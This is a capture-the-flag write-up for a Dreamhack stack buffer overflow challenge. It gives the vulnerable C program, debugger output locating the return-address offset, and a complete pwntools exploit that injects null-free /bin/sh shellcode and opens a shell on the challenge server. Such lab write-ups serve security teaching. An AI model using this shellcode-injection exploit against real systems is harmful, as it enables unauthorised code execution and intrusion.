# Write-up of the challenge "basic_exploitation_000"

This challenge is part of the "Binary exploitation" category and is in **Level 2**.

# Goal of the challenge

The objective of this challenge is to overwrite the **RIP** to a **shell**.

## Program structure

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}


```


## Security breach

The vulnerability is **scanf("%141s", buf);**, a basic buffer overflow example.


## Solution

So I started off by predicating what the author want us to do:

```
└─$ checksec --file=./basic_exploitation_000
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   79 Symbols        No    0               1               ./basic_exploitation_000
```

Looks like **NX is disabled so that means we can spawn a shell**, but we need to take **scanf("%141s", buf);** into consideration since it can stop reading when reaching **Null bytes**. So what we need to do is get the opcode for a shell that is **null free** and overwrite the **RIP** to make it point to the **shell**.

First I started by checking the offset to RIP using **cyclic pattern**:

```
 EAX  0
 EBX  0xf7f9ee14 ◂— 0x233d0c /* '\x0c=#' */
 ECX  0xf7fbf580 ◂— 0
 EDX  0
 EDI  0xf7ffcc60 (_rtld_global_ro) ◂— 0
 ESI  0x8048610 (__libc_csu_init) ◂— push ebp
 EBP  0x62616168 ('haab')
 ESP  0xffffcc40 ◂— 'jaabk'
 EIP  0x62616169 ('iaab')
```

```
pwndbg> cyclic -o iaab
Finding cyclic pattern of 4 bytes: b'iaab' (hex: 0x69616162)
Found at offset 132
```

Turns out the offset is **132** to reach the **RIP**. So since the program prints the start of the buffer **printf("buf = (%p)\n", buf);**, we can use it to later jump to it when setting our payload with the shell!

As you can see below:

```
from pwn import *
import re

# p = process('./basic_exploitation_000')

p = remote('host8.dreamhack.games', 9437)

p.recvuntil("buf = (")
buf = int(p.recv(10), 16)

# for null evading     scanf("%141s", buf);
shell = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
payload = shell
print(len(payload))
payload += b"A" * (132 - len(shell))
payload += p32(buf)

p.sendline(payload)

p.interactive()
```

